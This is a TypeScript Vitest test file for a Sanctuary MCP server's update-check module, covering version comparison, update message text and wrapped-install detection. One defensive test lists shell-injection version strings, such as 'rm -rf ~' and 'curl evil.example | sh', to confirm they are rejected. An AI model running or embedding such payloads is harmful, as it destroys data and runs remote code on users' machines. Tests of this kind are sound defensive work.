/**
 * Tests for the startup update check module.
 *
 * Tests version comparison logic and message formatting.
 * Network-dependent tests (fetchLatestVersion) are not included
 * to avoid flaky CI from registry availability.
 */

import { describe, it, expect, afterEach } from "vitest";
import { mkdtemp, mkdir, writeFile, rm } from "node:fs/promises";
import { tmpdir } from "node:os";
import { join } from "node:path";
import {
  isNewerVersion,
  formatUpdateMessage,
  detectWrappedInstall,
  extractNewerRegistryVersion,
} from "../src/update-check.js";

describe("update-check", () => {
  describe("isNewerVersion", () => {
    it("detects newer major version", () => {
      expect(isNewerVersion("0.3.1", "1.0.0")).toBe(true);
    });

    it("detects newer minor version", () => {
      expect(isNewerVersion("0.3.1", "0.4.0")).toBe(true);
    });

    it("detects newer patch version", () => {
      expect(isNewerVersion("0.3.1", "0.3.2")).toBe(true);
    });

    it("returns false for same version", () => {
      expect(isNewerVersion("0.3.1", "0.3.1")).toBe(false);
    });

    it("returns false for older version", () => {
      expect(isNewerVersion("0.4.0", "0.3.1")).toBe(false);
    });

    it("returns false when current is newer major", () => {
      expect(isNewerVersion("1.0.0", "0.9.9")).toBe(false);
    });

    it("handles v prefix", () => {
      expect(isNewerVersion("v0.3.1", "v0.4.0")).toBe(true);
    });

    it("handles mixed v prefix", () => {
      expect(isNewerVersion("0.3.1", "v0.4.0")).toBe(true);
      expect(isNewerVersion("v0.3.1", "0.4.0")).toBe(true);
    });
  });

  describe("formatUpdateMessage", () => {
    it("includes current and latest versions", () => {
      const msg = formatUpdateMessage("0.3.1", "0.4.0");
      expect(msg).toContain("0.3.1");
      expect(msg).toContain("0.4.0");
    });

    it("includes an update command pinned to the announced version", () => {
      const msg = formatUpdateMessage("0.3.1", "0.4.0");
      expect(msg).toContain("npx @sanctuary-framework/mcp-server@0.4.0");
      expect(msg).not.toContain("@latest");
    });

    it("uses [Sanctuary] prefix", () => {
      const msg = formatUpdateMessage("0.3.1", "0.4.0");
      expect(msg).toMatch(/^\[Sanctuary\]/);
    });

    it("is a single line", () => {
      const msg = formatUpdateMessage("0.3.1", "0.4.0");
      expect(msg).not.toContain("\n");
    });

    it("unwrapped advice is byte-identical to the pre-existing copy", () => {
      // The two-arg form is the pre-existing surface; the wrapped-install
      // variant must not have changed what unwrapped operators see.
      expect(formatUpdateMessage("0.3.1", "0.4.0")).toBe(
        "[Sanctuary] Update available: 0.3.1 → 0.4.0. Run: npx @sanctuary-framework/mcp-server@0.4.0"
      );
    });

    it("wrapped advice tells the operator to re-run protect pinned to the announced version", () => {
      const msg = formatUpdateMessage("0.3.1", "0.4.0", true);
      // The actionable command re-runs protect FROM the new version, which is
      // the mechanism that rewrites the pinned MCP entry. The bare npx server
      // command (which rewrites nothing) must NOT be the advertised action.
      expect(msg).toContain("npx @sanctuary-framework/mcp-server@0.4.0 protect");
      expect(msg).not.toContain("@latest");
      // Honesty: it says the pin exists and that a direct run does not upgrade.
      expect(msg).toContain("version-pinned");
    });

    it("wrapped advice is a single [Sanctuary]-prefixed line", () => {
      const msg = formatUpdateMessage("0.3.1", "0.4.0", true);
      expect(msg).toMatch(/^\[Sanctuary\]/);
      expect(msg).not.toContain("\n");
    });
  });

  describe("detectWrappedInstall", () => {
    const tempDirs: string[] = [];

    async function tempStorage(): Promise<string> {
      const dir = await mkdtemp(join(tmpdir(), "sanctuary-update-check-"));
      tempDirs.push(dir);
      return dir;
    }

    afterEach(async () => {
      for (const dir of tempDirs.splice(0)) {
        await rm(dir, { recursive: true, force: true });
      }
    });

    it("returns true when the canonical wrap-meta pointer file exists", async () => {
      const storage = await tempStorage();
      await mkdir(join(storage, "backup"), { recursive: true });
      await writeFile(
        join(storage, "backup", "wrap-meta.json"),
        JSON.stringify({ backupPath: "/x", originalPath: "/y" })
      );
      expect(await detectWrappedInstall(storage)).toBe(true);
    });

    it("returns false when no wrap-meta pointer file exists", async () => {
      const storage = await tempStorage();
      await mkdir(join(storage, "backup"), { recursive: true });
      expect(await detectWrappedInstall(storage)).toBe(false);
    });

    it("returns false (never throws) when the storage path does not exist", async () => {
      const storage = await tempStorage();
      expect(
        await detectWrappedInstall(join(storage, "no-such-subdir"))
      ).toBe(false);
    });

    it("returns false when the pointer path is a directory, not a file", async () => {
      const storage = await tempStorage();
      await mkdir(join(storage, "backup", "wrap-meta.json"), {
        recursive: true,
      });
      expect(await detectWrappedInstall(storage)).toBe(false);
    });
  });

  describe("extractNewerRegistryVersion (semver-shape injection guard)", () => {
    it("accepts a clean newer semver version", () => {
      expect(
        extractNewerRegistryVersion("1.6.1", JSON.stringify({ version: "1.7.0" }))
      ).toBe("1.7.0");
    });

    it("accepts a newer prerelease-shaped version", () => {
      expect(
        extractNewerRegistryVersion(
          "1.6.1",
          JSON.stringify({ version: "9.9.9-rc.1" })
        )
      ).toBe("9.9.9-rc.1");
    });

    it("rejects shell-injection-shaped version strings", () => {
      // Each of these would be interpolated into a copy-paste command the
      // operator is told to run; every one must be rejected on shape alone.
      const payloads = [
        "9.9.9; rm -rf ~",
        "9.9.9 && curl evil.example | sh",
        "9.9.9`touch /tmp/pwned`",
        "9.9.9$(reboot)",
        "9.9.9\ncurl evil.example",
        "9.9.9'; echo pwned; '",
        "latest",
        "v9.9.9",
        "9.9",
        "",
      ];
      for (const version of payloads) {
        expect(
          extractNewerRegistryVersion("1.6.1", JSON.stringify({ version }))
        ).toBe(null);
      }
    });

    it("rejects a missing or non-string version field", () => {
      expect(extractNewerRegistryVersion("1.6.1", "{}")).toBe(null);
      expect(
        extractNewerRegistryVersion("1.6.1", JSON.stringify({ version: 9 }))
      ).toBe(null);
      expect(
        extractNewerRegistryVersion("1.6.1", JSON.stringify(["1.7.0"]))
      ).toBe(null);
      expect(extractNewerRegistryVersion("1.6.1", "null")).toBe(null);
    });

    it("rejects malformed JSON without throwing", () => {
      expect(extractNewerRegistryVersion("1.6.1", "not json {")).toBe(null);
    });

    it("rejects a version that is not strictly newer", () => {
      expect(
        extractNewerRegistryVersion("1.6.1", JSON.stringify({ version: "1.6.1" }))
      ).toBe(null);
      expect(
        extractNewerRegistryVersion("1.6.1", JSON.stringify({ version: "1.5.0" }))
      ).toBe(null);
    });
  });
});
